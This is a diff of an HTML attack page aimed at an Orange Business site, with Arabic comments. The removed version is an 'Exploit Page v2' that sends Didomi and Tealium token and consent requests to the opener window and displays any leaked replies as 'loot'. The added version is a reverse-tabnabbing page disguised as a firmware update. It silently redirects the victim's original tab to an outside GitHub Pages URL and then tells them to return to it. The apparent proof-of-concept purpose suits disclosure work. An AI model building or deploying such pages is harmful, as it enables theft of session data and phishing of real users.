@@ -1,52 +1,45 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Exploit Page v2</title>
+    <meta charset="UTF-8">
+    <title>Authenticating Update...</title>
+    <style>
+        body { text-align: center; font-family: sans-serif; background-color: #f8f9fa; padding-top: 15vh; color: #333; }
+        .spinner { border: 6px solid #f3f3f3; border-top: 6px solid #ff7900; border-radius: 50%; width: 70px; height: 70px; animation: spin 1s linear infinite; margin: 0 auto 30px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .success-icon { display: none; font-size: 60px; color: #28a745; margin-bottom: 20px; }
+    </style>
 </head>
-<body style="background-color: #111; color: #0f0; font-family: monospace;">
-    <h1>Listening for Targets...</h1>
-    <p>Check the console for raw data.</p>
-    <div id="loot"></div>
+<body>
+    <div id="loading-view">
+        <div class="spinner"></div>
+        <h2>Processing Firmware Update...</h2>
+        <p>Please wait while we establish a secure connection.<br>Do not close this window.</p>
+    </div>
+
+    <div id="success-view" style="display: none;">
+        <div class="success-icon">✓</div>
+        <h2>Connection Established</h2>
+        <p style="color: #d9534f; font-weight: bold;">Please return to the original tab to continue.</p>
+    </div>
 
     <script>
-        // 1. الرادار: هيطبع أي حاجة توصل من أي موقع عشان نعرف الخلل فين
-        window.addEventListener("message", (event) => {
-            // هنطبع في الكونسول أي رسالة توصل أياً كان مصدرها
-            console.log("📥 Raw Message Caught!");
-            console.log("Origin:", event.origin);
-            console.log("Data:", event.data);
+        // رابط صفحة الإثبات اللي هترفعها في الخطوة الجاية
+        const pocDemonstrationPage = "https://hussein-e4.github.io/poc-demonstration.html"; 
 
-            // لو الرسالة جاية من أورانج، هنعرضها على الشاشة
-            if (event.origin.includes("orange-business.com")) {
-                document.getElementById("loot").innerHTML += 
-                    "<h2>🔥 BINGO! Data Leaked:</h2><pre>" + 
-                    JSON.stringify(event.data, null, 2) + "</pre><hr>";
-            }
-        });
-
-        // 2. إرسال حزمة من الأوامر القياسية اللي الأنظمة دي بتستجيب ليها
-        setInterval(() => {
+        setTimeout(() => {
             if (window.opener) {
-                // محاولة 1: استدعاء دالة getTokens اللي لقيناها في الكود
-                window.opener.postMessage({
-                    "__didomiCall": {
-                        "callId": Date.now().toString(),
-                        "type": "group",
-                        "call": "getTokens", 
-                        "params": {}
-                    }
-                }, "*");
-
-                // محاولة 2: أمر Didomi القياسي
-                window.opener.postMessage(JSON.stringify({ 
-                    didomiIframeMessage: true, 
-                    action: "getConsentData" 
-                }), "*");
-
-                // محاولة 3: أمر Tealium القياسي
-                window.opener.postMessage("tealium-ready", "*");
+                try {
+                    // هنا بنضرب التابة الأصلية
+                    window.opener.location = pocDemonstrationPage;
+                } catch (e) {
+                    console.log("Tabnabbing failed.");
+                }
             }
-        }, 1500);
+            document.getElementById('loading-view').style.display = 'none';
+            document.getElementById('success-view').style.display = 'block';
+            document.querySelector('.success-icon').style.display = 'block';
+        }, 2000);
     </script>
 </body>
 </html>
